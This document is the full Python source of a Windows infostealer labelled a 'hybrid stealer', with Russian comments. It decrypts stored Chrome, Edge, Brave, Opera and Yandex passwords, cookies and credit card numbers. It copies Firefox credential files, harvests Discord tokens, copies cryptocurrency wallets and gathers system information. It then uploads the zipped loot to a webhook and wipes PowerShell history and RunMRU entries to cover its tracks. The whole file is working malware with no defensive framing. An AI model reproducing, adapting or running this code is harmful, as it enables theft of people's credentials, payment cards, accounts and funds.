# Python 3.10+, Win10/11, единственная зависимость: requests
# st.py — hybrid stealer (Chromium/Firefox/Discord/wallet + sysinfo)
import os, sys, json, base64, shutil, sqlite3, glob, re, zipfile
import tempfile, subprocess, time, ctypes
from ctypes import wintypes
from pathlib import Path

WEBHOOK = sys.argv[1] if len(sys.argv) > 1 else ""
TAG     = (os.environ.get("COMPUTERNAME", "host") + "_" + str(int(time.time()))).replace(" ", "_")
WORK    = Path(tempfile.mkdtemp(prefix="x_"))
OUT     = WORK / "dump"

def safe(fn, *a, **k):
    try: return fn(*a, **k)
    except Exception: return None

# ============================================================
# DPAPI через ctypes (вместо pywin32)
# ============================================================
class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD),
                ("pbData", ctypes.POINTER(ctypes.c_char))]

crypt32  = ctypes.windll.crypt32
kernel32 = ctypes.windll.kernel32

def dpapi_dec(data: bytes) -> bytes | None:
    if not data: return None
    try:
        buf = ctypes.create_string_buffer(data, len(data))
        bin_ = DATA_BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
        bout = DATA_BLOB()
        ok = crypt32.CryptUnprotectData(
            ctypes.byref(bin_), None, None, None, None, 0, ctypes.byref(bout))
        if not ok: return None
        out = ctypes.string_at(bout.pbData, bout.cbData)
        kernel32.LocalFree(bout.pbData)
        return out
    except Exception:
        return None

# ============================================================
# AES-256-GCM через bcrypt.dll (вместо pycryptodome)
# ============================================================
bcrypt = ctypes.windll.bcrypt

class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
    _fields_ = [
        ("cbSize",            wintypes.ULONG),
        ("dwInfoVersion",     wintypes.ULONG),
        ("pbNonce",           ctypes.POINTER(ctypes.c_ubyte)),
        ("cbNonce",           wintypes.ULONG),
        ("pbAuthData",        ctypes.POINTER(ctypes.c_ubyte)),
        ("cbAuthData",        wintypes.ULONG),
        ("pbTag",             ctypes.POINTER(ctypes.c_ubyte)),
        ("cbTag",             wintypes.ULONG),
        ("pbMacContext",      ctypes.POINTER(ctypes.c_ubyte)),
        ("cbMacContext",      wintypes.ULONG),
        ("cbAAD",             wintypes.ULONG),
        ("cbData",            ctypes.c_ulonglong),
        ("dwFlags",           wintypes.ULONG),
    ]

def _bcrypt_open():
    hAlg = ctypes.c_void_p()
    status = bcrypt.BCryptOpenAlgorithmProvider(
        ctypes.byref(hAlg),
        ctypes.c_wchar_p("AES"),
        None,
        0x00000008)  # BCRYPT_PROV_DISPATCH? -> на практике: BCRYPT_ALG_HANDLE_HMAC_FLAG нет, 0
    if status != 0:
        # fallback: пробуем без флагов
        status = bcrypt.BCryptOpenAlgorithmProvider(
            ctypes.byref(hAlg), ctypes.c_wchar_p("AES"), None, 0)
    return hAlg if status == 0 else None

def aes_gcm_decrypt(key: bytes, nonce: bytes, ct: bytes, tag: bytes) -> bytes | None:
    """AES-256-GCM decrypt через bcrypt. key=32, nonce=12, tag=16."""
    hAlg = _bcrypt_open()
    if not hAlg: return None
    hKey = ctypes.c_void_p()
    try:
        if bcrypt.BCryptGenerateSymmetricKey(
                ctypes.byref(hKey), hAlg, None, 0,
                ctypes.c_char_p(key), len(key), 0) != 0:
            return None
        nonce_buf = (ctypes.c_ubyte * len(nonce)).from_buffer_copy(nonce)
        tag_buf   = (ctypes.c_ubyte * len(tag)).from_buffer_copy(tag)
        ct_buf    = ctypes.create_string_buffer(ct, len(ct))
        out_buf   = ctypes.create_string_buffer(len(ct))
        info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
        info.cbSize        = ctypes.sizeof(info)
        info.dwInfoVersion = 1
        info.pbNonce       = nonce_buf
        info.cbNonce       = len(nonce)
        info.pbTag         = tag_buf
        info.cbTag         = len(tag)
        written = wintypes.ULONG(0)
        st = bcrypt.BCryptDecrypt(
            hKey, ct_buf, len(ct), ctypes.byref(info),
            None, 0, out_buf, len(ct), ctypes.byref(written), 0)
        if st != 0: return None
        return out_buf.raw[:written.value]
    finally:
        if hKey: bcrypt.BCryptDestroyKey(hKey)
        bcrypt.BCryptCloseAlgorithmProvider(hAlg, 0)

# ============================================================
# Chromium: Local State → key, decrypt v10/v11
# ============================================================
def chrome_key(local_state: Path) -> bytes | None:
    try:
        ls  = json.loads(local_state.read_text(encoding="utf-8"))
        enc = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]  # срезаем 'DPAPI'
        return dpapi_dec(enc)
    except Exception:
        return None

def chrome_decrypt(blob: bytes, key: bytes | None) -> str | None:
    if not blob: return None
    try:
        if blob[:3] in (b"v10", b"v11") and key:
            nonce, ct, tag = blob[3:15], blob[15:-16], blob[-16:]
            out = aes_gcm_decrypt(key, nonce, ct, tag)
            return out.decode("utf-8", "ignore") if out else None
        # старые версии: DPAPI напрямую
        out = dpapi_dec(blob)
        return out.decode("utf-8", "ignore") if out else None
    except Exception:
        return None

CHROMIUM = {
    "Chrome":  Path(os.environ["LOCALAPPDATA"]) / "Google/Chrome/User Data",
    "Edge":    Path(os.environ["LOCALAPPDATA"]) / "Microsoft/Edge/User Data",
    "Brave":   Path(os.environ["LOCALAPPDATA"]) / "BraveSoftware/Brave-Browser/User Data",
    "Yandex":  Path(os.environ["LOCALAPPDATA"]) / "Yandex/YandexBrowser/User Data",
    "Opera":   Path(os.environ["APPDATA"])        / "Opera Software/Opera Stable",
    "OperaGX": Path(os.environ["APPDATA"])        / "Opera Software/Opera GX Stable",
}

def steal_chromium(name: str, ud: Path):
    if not ud.exists(): return
    key = chrome_key(ud / "Local State")
    profiles = [ud / "Default"] + sorted(ud.glob("Profile *"))
    for prof in profiles:
        if not prof.is_dir(): continue
        tag = f"{name}_{prof.name}"

        # --- пароли ---
        login_db = prof / "Login Data"
        if login_db.exists():
            with (OUT / f"{tag}_logins.txt").open("w", encoding="utf-8") as f:
                con = sqlite3.connect(f"file:{login_db}?mode=ro&immutable=1", uri=True)
                for url, user, pw in con.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"):
                    dec = chrome_decrypt(pw, key)
                    if dec:
                        f.write(f"{url}\t{user}\t{dec}\n")
                con.close()

        # --- cookies ---
        cook_db = prof / "Network" / "Cookies"
        if not cook_db.exists(): cook_db = prof / "Cookies"
        if cook_db.exists():
            with (OUT / f"{tag}_cookies.txt").open("w", encoding="utf-8") as f:
                con = sqlite3.connect(f"file:{cook_db}?mode=ro&immutable=1", uri=True)
                for host, cname, enc, path in con.execute(
                        "SELECT host_key, name, encrypted_value, path FROM cookies"):
                    dec = chrome_decrypt(enc, key)
                    if dec:
                        f.write(f"{host}\t{cname}\t{dec}\t{path}\n")
                con.close()

        # --- карты ---
        web_db = prof / "Web Data"
        if web_db.exists():
            with (OUT / f"{tag}_cards.txt").open("w", encoding="utf-8") as f:
                con = sqlite3.connect(f"file:{web_db}?mode=ro&immutable=1", uri=True)
                for num, exp, nm in con.execute(
                        "SELECT card_number_encrypted, "
                        "expiration_month||'/'||expiration_year, name_on_card FROM credit_cards"):
                    dec = chrome_decrypt(num, key) or ""
                    f.write(f"{nm}\t{dec}\t{exp}\n")
                con.close()

# ============================================================
# Firefox: копируем key4/logins/cookies + raw cookies.sqlite (значения видны)
# ============================================================
def steal_firefox():
    root = Path(os.environ["APPDATA"]) / "Mozilla/Firefox/Profiles"
    if not root.exists(): return
    for prof in root.glob("*"):
        for fn in ("key4.db", "logins.json", "cookies.sqlite", "places.sqlite", "cert9.db"):
            src = prof / fn
            if src.exists():
                safe(shutil.copy2, src, OUT / f"ff_{prof.name}_{fn}")
        ck = prof / "cookies.sqlite"
        if ck.exists():
            try:
                con = sqlite3.connect(f"file:{ck}?mode=ro&immutable=1", uri=True)
                with (OUT / f"ff_{prof.name}_cookies_raw.txt").open("w", encoding="utf-8") as f:
                    for host, name, val in con.execute(
                            "SELECT host, name, value FROM moz_cookies"):
                        f.write(f"{host}\t{name}\t{val}\n")
                con.close()
            except Exception:
                pass

# ============================================================
# Discord tokens: regex по leveldb
# ============================================================
def steal_discord():
    pat = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}")
    mfa = re.compile(r"mfa\.[\w-]{80,90}")
    seen, lines = set(), []
    for base in ("discord", "discordcanary", "discordptb"):
        r = Path(os.environ["APPDATA"]) / base / "Local Storage" / "leveldb"
        if not r.exists(): continue
        for f in glob.glob(str(r / "*.ldb")) + glob.glob(str(r / "*.log")):
            try:
                raw = Path(f).read_bytes().decode("utf-8", "ignore")
            except Exception:
                continue
            for m in pat.findall(raw) + mfa.findall(raw):
                if m not in seen:
                    seen.add(m); lines.append(m)
    if lines:
        (OUT / "discord_tokens.txt").write_text("\n".join(lines), encoding="utf-8")

# ============================================================
# Кошельки
# ============================================================
WALLETS = {
    "Exodus":   Path(os.environ["APPDATA"]) / "Exodus/exodus.wallet",
    "Electrum": Path(os.environ["APPDATA"]) / "Electrum/wallets",
    "Ethereum": Path(os.environ["APPDATA"]) / "Ethereum/keystore",
    "Monero":   Path(os.environ["APPDATA"]) / "bitmonero",
    "Zcash":    Path(os.environ["APPDATA"]) / "Zcash",
    "Bytecoin": Path(os.environ["APPDATA"]) / "bytecoin",
}
def steal_wallets():
    for name, src in WALLETS.items():
        if not src.exists(): continue
        dst = OUT / f"wallet_{name}"
        if src.is_dir():
            safe(shutil.copytree, src, dst)
        else:
            safe(shutil.copy2, src, dst)

# ============================================================
# Sysinfo — модуль из xenon.py, Windows-версия
# ============================================================
SYSINFO = {
    "hostname":  "hostname",
    "whoami":    "whoami /all",
    "ipconfig":  "ipconfig /all",
    "systeminfo":"systeminfo",
    "ports":     "netstat -an",
    "processes": "tasklist /v",
    "users":     "query user",
    "services":  "sc query state= all",
    "wifi":      "netsh wlan show profiles",
    "net_share": "net share",
    "arp":       "arp -a",
    "routes":    "route print",
    "drives":    "wmic logicaldisk get name,size,freespace",
    "installed": "wmic product get name,version",
}

def steal_sysinfo():
    out = {}
    for k, cmd in SYSINFO.items():
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True,
                               text=True, timeout=10)
            out[k] = r.stdout.strip() if r.returncode == 0 else f"err: {r.stderr.strip()}"
        except subprocess.TimeoutExpired:
            out[k] = "timeout"
        except Exception as e:
            out[k] = f"err: {e}"
    (OUT / "sysinfo.json").write_text(
        json.dumps(out, indent=2, ensure_ascii=False), encoding="utf-8")

# ============================================================
# Pack & exfil
# ============================================================
def pack_and_send():
    if not WEBHOOK:
        return
    zip_path = WORK / f"dump_{TAG}.zip"
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(OUT):
            for fn in files:
                p = Path(root) / fn
                z.write(p, p.relative_to(OUT))
    try:
        import requests
        with zip_path.open("rb") as fh:
            requests.post(
                WEBHOOK,
                data={"content": f"```{TAG}```"},
                files={"file": (zip_path.name, fh, "application/zip")},
                headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                                       "Chrome/120.0.0.0 Safari/537.36"},
                timeout=60)
    except Exception:
        pass

# ============================================================
# Cleanup
# ============================================================
def self_clean():
    for h in [
        Path(os.environ["APPDATA"]) / "Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",
    ]:
        safe(h.unlink)
    safe(subprocess.run,
         ["cmd", "/c",
          r"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f"],
         capture_output=True, timeout=10)
    # история браузера? — оставляем, чистить — отдельная задача
    safe(subprocess.run,
         ["cmd", "/c", r"del /f /q %TEMP%\*_cl_*.bat"],
         capture_output=True, timeout=10)

# ============================================================
# Main
# ============================================================
def main():
    OUT.mkdir(parents=True, exist_ok=True)
    for n, ud in CHROMIUM.items():
        safe(steal_chromium, n, ud)
    safe(steal_firefox)
    safe(steal_discord)
    safe(steal_wallets)
    safe(steal_sysinfo)
    safe(pack_and_send)
    self_clean()
    safe(shutil.rmtree, WORK, True)

if __name__ == "__main__":
    main()